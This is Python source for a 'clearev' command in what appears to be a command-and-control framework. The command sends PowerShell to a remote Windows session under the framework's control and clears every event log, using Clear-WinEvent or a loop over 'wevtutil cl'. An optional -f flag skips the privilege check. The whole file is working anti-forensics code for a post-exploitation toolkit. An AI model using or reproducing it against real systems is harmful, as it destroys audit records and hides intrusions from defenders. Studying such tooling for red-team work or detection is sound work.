from core.gunnershell.commands.base import register, Command
from core.session_handlers import session_manager

# Command Execution Imports
from core.command_execution import http_command_execution as http_exec
from core.command_execution import tcp_command_execution as tcp_exec

from colorama import Style, Fore
brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"

@register("clearev")
class ClearevCommand(Command):
	"""Clear Windows event logs: clearev [-f]"""

	@property
	def help(self):
		return "clearev [-f]    Clear event logs"

	def execute(self, args):
		force = "-f" in args or "--force" in args
		out = self.logic(self.gs.sid, self.gs.os_type, force=force, op_id=self.op_id)
		if out:
			print(brightgreen + out)

	def logic(self, sid, os_type, force=False, op_id="console"):
		"""
		Clear all Windows event logs.

		Usage:
			clearev            # only if Admin or SeSecurityPrivilege
			clearev -f|--force # skip privilege check
		"""
		display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
		if "windows" not in os_type:
			return brightyellow + "[*] clearev only supported on Windows"

		# Build the check snippet
		check_snippet = (
			"$id = [Security.Principal.WindowsIdentity]::GetCurrent(); "
			"$pr = New-Object Security.Principal.WindowsPrincipal($id); "
			"$isAdmin = $pr.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator); "
			"$hasSecPriv = (whoami /priv | Select-String SeSecurityPrivilege).Line -match 'Enabled'; "
			"if (-not ($isAdmin -or $hasSecPriv)) { "
			"Write-Output 'Insufficient privileges: must be local Administrator or have SeSecurityPrivilege'; "
			"exit 0 "
			"}; "
		)

		# Build the clear-logs snippet
		clear_snippet = (
			"if (Get-Command Clear-WinEvent -ErrorAction SilentlyContinue) { "
			"Get-WinEvent -ListLog * | ForEach-Object { Clear-WinEvent -LogName $_.LogName -ErrorAction SilentlyContinue } "
			"} else { "
			"wevtutil el | ForEach-Object { wevtutil cl $_ 2>$null } "
			"}"
		)

		# Assemble full command
		if force != False:
			ps_cmd = clear_snippet
		else:
			ps_cmd = check_snippet + clear_snippet

		sess = session_manager.sessions.get(sid)
		if not sess:
			return brightred + f"[!] No such session: {display}"

		# Dispatch
		if sess.transport.lower() in ("http", "https"):
			out = http_exec.run_command_http(sid, ps_cmd, op_id=op_id)
		else:
			out = tcp_exec.run_command_tcp(sid, ps_cmd, timeout=3, portscan_active=True, op_id=op_id)

		return out or brightgreen + "[*] Event logs cleared."